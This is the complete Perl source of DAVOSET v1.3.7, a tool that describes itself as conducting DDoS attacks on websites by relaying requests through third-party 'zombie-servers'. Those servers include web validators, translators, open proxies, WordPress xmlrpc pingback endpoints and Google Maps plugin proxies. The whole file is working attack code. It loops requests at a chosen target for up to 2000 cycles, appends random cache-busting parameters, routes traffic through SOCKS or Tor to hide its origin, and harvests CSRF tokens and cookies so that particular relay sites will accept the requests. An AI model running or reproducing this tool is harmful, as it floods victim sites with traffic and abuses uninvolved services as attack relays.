#!/usr/bin/perl
# DDoS attacks via other sites execution tool
# DAVOSET v.1.3.7
# Tool for conducting of DDoS attacks on the sites via other sites
# Copyright (C) MustLive 2010-2018
# Last update: 17.12.2018
# http://websecurity.com.ua
#############################################
# Settings
my $version = "1.3.7"; # program version
my $agent = "Mozilla/5.0 (compatible; MSIE 9.0)"; # user agent
my $default_port = "80"; # default port of the host
my $show_stat = 1; # show statistic of work
my $verbose = 1; # show process of work
my $default_site = ""; # default site for attack
my $testURL = "http://google.com"; # default site for testing botnet
my $list_servers = "list_full.txt"; # list of zombie-servers
my $mode = "0"; # 0 - standard mode, 1 - cyclic mode
my $cycles = "1000"; # number of cycles in cyclic mode
my $max_cycles = "2000"; # maximum number of cycles in cyclic mode
my $log = 1; # 0 - turn off, 1 - turn on logging
my $log_file = "logs.txt"; # log with results of work
my $cache = 0; # cache bypass
my $proxy = 0; # 0 - no proxy, 1 - Socks proxy, 2 - Tor
my $proxyserver = ""; # Socks server
my $proxyport = "1080"; # Socks port
if ($proxy == 2) { # for Tor
	$proxyserver = "127.0.0.1";
	$proxyport = "9051";
}
#############################################
use IO::Socket;
use IO::Socket::Socks;

my (@list,$input,$site,$item,$servers,$cycle,$i,$req,$time,$time1,$time2,$speed,$speed2,$sec,$hour,$traffic);

if ($#ARGV >= 0) {
	for ($i=0;$i<=$#ARGV;$i++){
		if ($ARGV[$i] =~ /^u=(.+)$/) { # URL
			$site = $1;
		}
		elsif ($ARGV[$i] =~ /^test$/) { # test
			$site = "test";
		}
		elsif ($ARGV[$i] =~ /^l=(.+)$/) { # file with list
			$list_servers = $1;
		}
		elsif ($ARGV[$i] =~ /^m=(\d)$/) { # mode
			if ($1 == 1) {
				$mode = 1;
			}
			else {
				$mode = 0;
			}
		}
		elsif ($ARGV[$i] =~ /^c=(\d+)$/) { # number of cycles
			$cycles = $1;
		}
		elsif ($ARGV[$i] =~ /^log=(\d)$/) { # logging
			if ($1 == 1) {
				$log = 1;
			}
			else {
				$log = 0;
			}
		}
		elsif ($ARGV[$i] =~ /^b=(\d)$/) { # cache bypass
			if ($1 == 1) {
				$cache = 1;
			}
			else {
				$cache = 0;
			}
		}
		elsif ($ARGV[$i] =~ /^p=(\d)$/) { # $proxy
			if ($1 == 1) {
				$proxy = 1;
			}
			elsif ($1 == 2) {
				$proxy = 2;
			}
			else {
				$proxy = 0;
			}
		}
	}
}

&Info;
open(FILE,"<$list_servers") || die "\nFile $list_servers not found.\n";
@list = <FILE>;
close(FILE);
foreach $item (@list) {
	chomp($item);
	if ($item && substr($item,0,1) ne "#") {
		$servers++;
	}
}
if (!$site) {
	print "Site: ";
	$input = <STDIN>;
	chomp($input);
	if (!$input) {
		$site = $default_site;
	}
	else {
		$site = $input;
	}
}
if ($site eq "test") {
	Logging("Test on $testURL") if $log;
	&Test;
}
$site =~ s/&/%26/g; # for correct work with zombie-servers
Logging("Attack on $site") if $log;

print "\nSite $site is attacking by $servers zombie-servers...\n\n";
$time1 = (time)[0] if $show_stat;
$cycles = 1 if (!$mode || $cycles < 1);
$cycles = $max_cycles if ($cycles > $max_cycles);
for ($cycle=0;$cycle<$cycles;$cycle++) {
	$i = 0;
	foreach $item (@list) {
		chomp($item);
		if ($item && substr($item,0,1) ne "#") {
			$i++;
			print "$i\n" if $verbose;
			my ($url,$method,$file) = split /;/,$item;
			if ($method eq "POST" or $method eq "XML" or $method eq "WP") {
				if (open(FILE,"<$file")) {
					my $params = <FILE>;
					chomp($params);
					close(FILE);
					Attack($site,$url,$method,$params);
				}
				else {
					print "\nFile $file not found.\n" if $verbose;
				}
			}
			else {
				Attack($site,$url,$method);
			}
		}
	}
	$req += $i;
}
$time2 = (time)[0] if $show_stat;
print "\n" if $verbose;
print "Attack has been conducted.\n";
if ($show_stat) {
	$time = $time2-$time1;
	$time |= 1;
	$speed = $req/$time;
	$speed2 = length($traffic)/$time;
	$hour = int($time/360);
	$sec = $time%60;
	$sec = "0".$sec if ($sec<10);
	print "\nTime: ";
	if ($hour) {
		print "$hour:".(int($time/60)-$hour*60).":$sec.\n";
	}
	else {
		print int($time/60).":$sec.\n";
	}
	print "Requests: $req, Bytes: ".length($traffic).".\n";
	printf "Speed: %0.5f req/s, %0.5f B/s.\n",$speed,$speed2;
}

sub Info { # info
	print qq~
DDoS attacks via other sites execution tool
DAVOSET v.$version
Copyright (C) MustLive 2010-2018

~;
}

sub Attack { # send request to zombie-server
	my $site = $_[0];
	my $url = $_[1];
	my $method = $_[2];
	my $params = $_[3];
	my ($sock,$host,$page,$port,$csrftoken,$cookie);

	$site =~ s|^https?://|| if ($url =~ /plugin_googlemap2_proxy.php/);
	$site =~ s|^https?://|| if ($url =~ /plugin_googlemap3_proxy.php/);
	$site =~ s|^https?://|| if ($url =~ /plugin_googlemap2_kmlprxy.php/);
	$site =~ s|^https?://|| if ($url =~ /plugin_googlemap3_kmlprxy.php/);
	$site =~ s|^https?://|| if ($url =~ /.wp.com/);
	$site = "http://$site" if ($site !~ /^https?:/ && CheckURL($url));
	$site =~ s|://|/| if ($url =~ /proxy2974.my-addr.org/);
	if ($cache) {
		$site .= "/" if ($site !~ /\/$/);
		if ($site =~ /\?/ || $site =~ /%3F/) {
			$site .= "%26" . int(rand(time));
		}
		else {
			$site .= "%3F" . int(rand(time));
		}
	}
	if ($method eq "WP") {
		$url =~ m|https?://([^/]+)(/.+/)?([^/]+)?|;
		$host = $1;
		$page = $2;
	}
	else {
		$url =~ m|https?://([^/]+)(/.+)?|;
		$host = $1;
		$page = $2;
	}
	$page |= "/";
	$port = $1 if ($host =~ /:(\d+)$/);
	$port ||= $default_port;
	if ($host eq "browsershots.org") {
		$csrftoken = &GetCsrfToken;
	}
	elsif (CheckCookie($host)) {
		$cookie = &GetCookie($url);
	}
	if ($proxy) {
		$sock = IO::Socket::Socks->new(ProxyAddr => "$proxyserver", ProxyPort => "$proxyport", ConnectAddr => "$host", ConnectPort => "$port");
	}
	else {
		$sock = IO::Socket::INET->new(Proto => "tcp", PeerAddr => "$host", PeerPort => "$port");
	}
	if (!$sock) {
		print "- The Socket: $!\n" if $verbose;
		return;
	}
	if ($method eq "BYPASS") {
		$host =~ /^(www\.)?(.+)\.\w+$/;
		$site = "$2.$site";
	}
	if ($method eq "POST") {
		$params .= $site;
		$params .= "&csrfmiddlewaretoken=$csrftoken" if $csrftoken;
		print $sock "POST $page HTTP/1.1\n";
		print $sock "Host: $host\n";
		print $sock "User-Agent: $agent\n";
		print $sock "Accept: */*\n";
		print $sock "Content-Length: ". length($params) ."\n";
		print $sock "Content-Type: application/x-www-form-urlencoded\n";
		print $sock "Cookie: csrftoken=$csrftoken\n" if $csrftoken;
		print $sock "Cookie: $cookie\n" if $cookie;
		print $sock "Connection: close\n\n";
		print $sock "$params\r\n\r\n";
	}
	elsif ($method eq "XML" or $method eq "WP") {
		$params =~ s|http://site|$site|;
		if ($method eq "WP") {
			$params =~ s|http://source|$host|;
			$page .= "xmlrpc.php";
		}
		print $sock "POST $page HTTP/1.1\n";
		print $sock "Host: $host\n";
		if ($url =~ /xmlpserver/) {
			print $sock "Content-Type: text/xml;charset=UTF-8\n";
			print $sock "SOAPAction: \#replyToXML\n";
		}
		elsif ($url =~ /ServerNodesWSService/) {
			print $sock "Content-Type: text/xml\n";
		}
		else {
			print $sock "User-Agent: $agent\n";
			print $sock "Accept: */*\n";
			print $sock "Content-Type: application/x-www-form-urlencoded\n";
		}
		print $sock "Content-Length: ". length($params) ."\n";
		print $sock "Connection: close\n\n";
		print $sock "$params\r\n\r\n";
	}
	else {
		if ($url =~ m|^http://translate.yandex.net|) {
			print $sock "GET $page$site/ HTTP/1.1\n";
		}
		elsif ($page =~ m|"http://site|) {
			$page =~ s|"http://site|"$site|;
			print $sock "GET $page HTTP/1.1\n";
		}
		else {
			print $sock "GET $page$site HTTP/1.1\n";
		}
		print $sock "Host: $host\n";
		print $sock "User-Agent: $agent\n";
		print $sock "Accept: */*\n";
		print $sock "Connection: close\r\n\r\n";
	}
	if ($show_stat) {
		if ($method eq "POST") {
			$traffic .= "POST $page HTTP/1.1\nHost: $host\nUser-Agent: $agent\nAccept: */*\nContent-Length: ". length($params) ."\nContent-Type: application/x-www-form-urlencoded\n";
			$traffic .= "Cookie: csrftoken=$csrftoken\n" if $csrftoken;
			$traffic .= "Cookie: $cookie\n" if $cookie;
			$traffic .= "Connection: close\n\n$params\r\n\r\n";
		}
		elsif ($method eq "XML" or $method eq "WP") {
			$traffic .= "POST $page HTTP/1.1\nHost: $host\nUser-Agent: $agent\nAccept: */*\nContent-Length: ". length($params) ."\nContent-Type: application/x-www-form-urlencoded\nConnection: close\n\n$params\r\n\r\n";
		}
		else {
			$traffic .= "GET $page$site";
			$traffic .= "/" if ($url =~ m|^http://translate.yandex.net|);
			$traffic .= " HTTP/1.1\nHost: $host\nUser-Agent: $agent\nAccept: */*\nConnection: close\r\n\r\n";
		}
	}
}

sub Test { # test list of zombie-servers
	print "\nThe botnet with $servers zombie-servers is checking...\n\n";
	$i = 0;
	foreach $item (@list) {
		chomp($item);
		if ($item) {
			$i++;
			print $i." - " if $verbose;
			my ($url,$method,$file) = split /;/,$item;
			if ($method eq "POST" or $method eq "XML" or $method eq "WP") {
				if (open(FILE,"<$file")) {
					my $params = <FILE>;
					chomp($params);
					close(FILE);
					TestServer($testURL,$url,$method,$params);
				}
				else {
					print "\nFile $file not found.\n" if $verbose;
				}
			}
			else {
				TestServer($testURL,$url,$method);
			}
		}
	}
	exit();
}

sub TestServer { # test zombie-server
	my $site = $_[0];
	my $url = $_[1];
	my $method = $_[2];
	my $params = $_[3];
	my ($sock,$host,$page,$content,$csrftoken,$cookie);

	$site =~ s|^https?://|| if ($url =~ /plugin_googlemap2_proxy.php/);
	$site =~ s|^https?://|| if ($url =~ /plugin_googlemap3_proxy.php/);
	$site =~ s|^https?://|| if ($url =~ /plugin_googlemap2_kmlprxy.php/);
	$site =~ s|^https?://|| if ($url =~ /plugin_googlemap3_kmlprxy.php/);
	$site =~ s|^https?://|| if ($url =~ /.wp.com/);
	$site = "http://$site" if ($site !~ /^https?:/ && CheckURL($url));
	$site =~ s|://|/| if ($url =~ /proxy2974.my-addr.org/);
	if ($cache) {
		$site .= "/" if ($site !~ /\/$/);
		if ($site =~ /\?/ || $site =~ /%3F/) {
			$site .= "%26" . int(rand(time));
		}
		else {
			$site .= "%3F" . int(rand(time));
		}
	}
	if ($method eq "WP") {
		$url =~ m|https?://([^/]+)(/.+/)?([^/]+)?|;
		$host = $1;
		$page = $2;
	}
	else {
		$url =~ m|https?://([^/]+)(/.+)?|;
		$host = $1;
		$page = $2;
	}
	$page |= "/";
	$port = $1 if ($host =~ /:(\d+)$/);
	$port ||= $default_port;
	if ($host eq "browsershots.org") {
		$csrftoken = &GetCsrfToken;
	}
	elsif (CheckCookie($host)) {
		$cookie = &GetCookie($url);
	}
	if ($proxy) {
		$sock = IO::Socket::Socks->new(ProxyAddr => "$proxyserver", ProxyPort => "$proxyport", ConnectAddr => "$host", ConnectPort => "$port");
	}
	else {
		$sock = IO::Socket::INET->new(Proto => "tcp", PeerAddr => "$host", PeerPort => "$port");
	}
	if (!$sock) {
		print "The Socket: $!\n" if $verbose;
		return;
	}
	if ($method eq "BYPASS") {
		$host =~ /^(www\.)?(.+)\.\w+$/;
		$site = "$2.$site";
	}
	if ($method eq "POST") {
		$params .= $site;
		$params .= "&csrfmiddlewaretoken=$csrftoken" if $csrftoken;
		print $sock "POST $page HTTP/1.1\n";
		print $sock "Host: $host\n";
		print $sock "User-Agent: $agent\n";
		print $sock "Accept: */*\n";
		print $sock "Content-Length: ". length($params) ."\n";
		print $sock "Content-Type: application/x-www-form-urlencoded\n";
		print $sock "Cookie: csrftoken=$csrftoken\n" if $csrftoken;
		print $sock "Cookie: $cookie\n" if $cookie;
		print $sock "Connection: close\n\n";
		print $sock "$params\r\n\r\n";
	}
	elsif ($method eq "XML" or $method eq "WP") {
		$params =~ s|http://site|$site|;
		if ($method eq "WP") {
			$params =~ s|http://source|$host|;
			$page .= "xmlrpc.php";
		}
		print $sock "POST $page HTTP/1.1\n";
		print $sock "Host: $host\n";
		if ($url =~ /xmlpserver/) {
			print $sock "Content-Type: text/xml;charset=UTF-8\n";
			print $sock "SOAPAction: \#replyToXML\n";
		}
		elsif ($url =~ /ServerNodesWSService/) {
			print $sock "Content-Type: text/xml\n";
		}
		else {
			print $sock "User-Agent: $agent\n";
			print $sock "Accept: */*\n";
			print $sock "Content-Type: application/x-www-form-urlencoded\n";
		}
		print $sock "Content-Length: ". length($params) ."\n";
		print $sock "Connection: close\n\n";
		print $sock "$params\r\n\r\n";
	}
	else {
		if ($url =~ m|^http://translate.yandex.net|) {
			print $sock "GET $page$site/ HTTP/1.1\n";
		}
		elsif ($page =~ m|"http://site|) {
			$page =~ s|"http://site|"$site|;
			print $sock "GET $page HTTP/1.1\n";
		}
		else {
			print $sock "GET $page$site HTTP/1.1\n";
		}
		print $sock "Host: $host\n";
		print $sock "User-Agent: $agent\n";
		print $sock "Accept: */*\n";
		print $sock "Connection: close\r\n\r\n";
	}
	$content = "";
	while (<$sock>) {
		$content .= $_;
	}
	if ($content =~ /HTTP\/\d.\d (\d\d\d)/){
		if ($1 >= 400){
			print "Error ($1)\n" if $verbose;
		}
		else {
			print "OK ($1)\n" if $verbose;
		}
	}
	else {
		print "Error\n" if $verbose;
	}
}

sub GetCsrfToken { # get CSRF token
	my ($sock,$content,$csrftoken);

	if ($proxy) {
		$sock = IO::Socket::Socks->new(ProxyAddr => "$proxyserver", ProxyPort => "$proxyport", ConnectAddr => "browsershots.org", ConnectPort => "80");
	}
	else {
		$sock = IO::Socket::INET->new(Proto => "tcp", PeerAddr => "browsershots.org", PeerPort => "80");
	}
	if (!$sock) {
		print "The Socket: $!\n" if $verbose;
		return;
	}
	print $sock "GET / HTTP/1.1\n";
	print $sock "Host: browsershots.org\n";
	print $sock "User-Agent: $agent\n";
	print $sock "Accept: */*\n";
	print $sock "Connection: close\r\n\r\n";
	$content = "";
	while (<$sock>) {
		$content .= $_;
	}
	$csrftoken = $1 if ($content =~ /name='csrfmiddlewaretoken' value='(.+?)'/);
	if ($show_stat) {
		$traffic .= "GET / HTTP/1.1\nHost: browsershots.org\nUser-Agent: $agent\nAccept: */*\nConnection: close\r\n\r\n";
	}
	return $csrftoken;
}

sub GetCookie { # get cookie
	my $url = $_[0];
	my ($host,$page,$sock,$content,@cookies,$cookie);

	$url =~ m|https?://([^/]+)(/.+)?|;
	$host = $1;
	$page = $2;
	if ($host eq "ping-admin.ru") {
		$page =~ s/index.sema/free_seo\//;
	}
	else {
		$page = "/";
	}
	if ($proxy) {
		$sock = IO::Socket::Socks->new(ProxyAddr => "$proxyserver", ProxyPort => "$proxyport", ConnectAddr => "$host", ConnectPort => "80");
	}
	else {
		$sock = IO::Socket::INET->new(Proto => "tcp", PeerAddr => "$host", PeerPort => "80");
	}
	if (!$sock) {
		print "The Socket: $!\n" if $verbose;
		return;
	}
	print $sock "GET $page HTTP/1.1\n";
	print $sock "Host: $host\n";
	print $sock "User-Agent: $agent\n";
	print $sock "Accept: */*\n";
	print $sock "Connection: close\r\n\r\n";
	$content = "";
	while (<$sock>) {
		$content .= $_;
	}
	if ($host eq "ping-admin.ru") {
		while ($content =~ /Set-Cookie: (.+?); /gi) {
			push(@cookies,$1);
		}
		$cookie = join("; ",@cookies);
	}
	else {
		$content =~ /Set-Cookie: (s=.+?); /i;
		$cookie = $1;
	}
	if ($show_stat) {
		$traffic .= "GET $page HTTP/1.1\nHost: $host\nUser-Agent: $agent\nAccept: */*\nConnection: close\r\n\r\n";
	}
	return $cookie;
}

sub Logging { # Logging results of work
	my @months = ('01','02','03','04','05','06','07','08','09','10','11','12');
	my ($sec,$min,$hour,$day,$mon,$year) = (localtime(time))[0,1,2,3,4,5];
	$year += 1900;
	$sec = "0".$sec if ($sec<10);
	$min = "0".$min if ($min<10);
	$hour = "0".$hour if ($hour<10);
	$day = "0".$day if ($day<10);
	my $date = "$day.$months[$mon].$year $hour:$min:$sec";

	open(FILE, ">>$log_file");
	print FILE "$date;$_[0]\n";
	close(FILE);
}

sub CheckURL { # web sites which require "http" for target URL
	my $url = $_[0];

	return 1 if ($url =~ m|^http://regex.info|);
	return 1 if ($url =~ m|^http://anonymouse.org|);
	return 1 if ($url =~ m|^http://validator.w3.org|);
	return 1 if ($url =~ m|^http://www.netvibes.com|);
	return 1 if ($url =~ m|^http://services.w3.org|);
	return 1 if ($url =~ m|^http://proxy2974.my-addr.org|);
	return 1 if ($url =~ m|^http://dacd.win|);
	return 1 if ($url =~ m|^http://mundoprimaria.com|);
	return 0;
}

sub CheckCookie { # web sites which require cookies
	my $url = $_[0];

	return 1 if ($url eq "ping-admin.ru");
	return 1 if ($url eq "ghostproxy.eu");
	return 1 if ($url eq "yavz.xyz");
	return 1 if ($url eq "iwaz.gq");
	return 1 if ($url eq "shinyproxy.com");
	return 1 if ($url eq "bypasstool.gq");
	return 0;
}
